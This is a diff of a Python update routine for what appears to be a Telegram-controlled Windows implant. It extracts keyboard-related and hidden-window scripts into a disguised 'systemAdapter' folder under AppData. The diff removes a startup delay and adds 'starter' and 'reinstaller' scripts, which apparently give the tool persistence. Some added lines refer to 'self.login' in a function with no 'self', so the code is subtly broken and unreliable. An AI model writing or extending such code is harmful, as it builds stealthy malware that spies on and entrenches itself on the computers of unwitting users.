@@ -15,7 +15,6 @@ import random
 import wget
 import shutil
 
-time.sleep(30)
 
 login = os.getlogin()
 admin = cfg.admin_id
@@ -34,15 +33,22 @@ def updating():
 		zipper.extract("tg_VRS-master/lsKeyboard.py", f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter")
 		zipper.extract("tg_VRS-master/lsSetup.pyw", f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter")
 		zipper.extract("tg_VRS-master/lsUtils.py", f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter")
+		zipper.extract("tg_VRS-master/starter.pyw", f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter")
+		zipper.extract("tg_VRS-master/reinstaller.pyw", f"C:\\Users\\{self.login}\\AppData\\Roaming\\systemAdapter")
+
 		zipper.close()
 			
 		shutil.copy(f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter\\tg_VRS-master\\db.py", f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter")
 		shutil.copy(f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter\\tg_VRS-master\\lsKeyboard.py", f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter")
 		shutil.copy(f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter\\tg_VRS-master\\lsSetup.pyw", f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter")
 		shutil.copy(f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter\\tg_VRS-master\\lsUtils.py", f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter")
+		shutil.copy(f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter\\tg_VRS-master\\starter.pyw", f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter")
+		shutil.copy(f"C:\\Users\\{self.login}\\AppData\\Roaming\\systemAdapter\\tg_VRS-master\\reinstaller.pyw", f"C:\\Users\\{self.login}\\AppData\\Roaming\\systemAdapter")
+
+
 
 		os.remove(f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter\\tg_VRS-master.zip")
-		files_ = ["db.py", "lsKeyboard.py", "lsSetup.pyw", "lsUtils.py"]
+		files_ = ["db.py", "lsKeyboard.py", "lsSetup.pyw", "lsUtils.py", "starter.pyw", "reinstaller.pyw"]
 		for i in files_:
 			os.remove(f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter\\tg_VRS-master\\{i}")
 		os.rmdir(f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter\\tg_VRS-master")
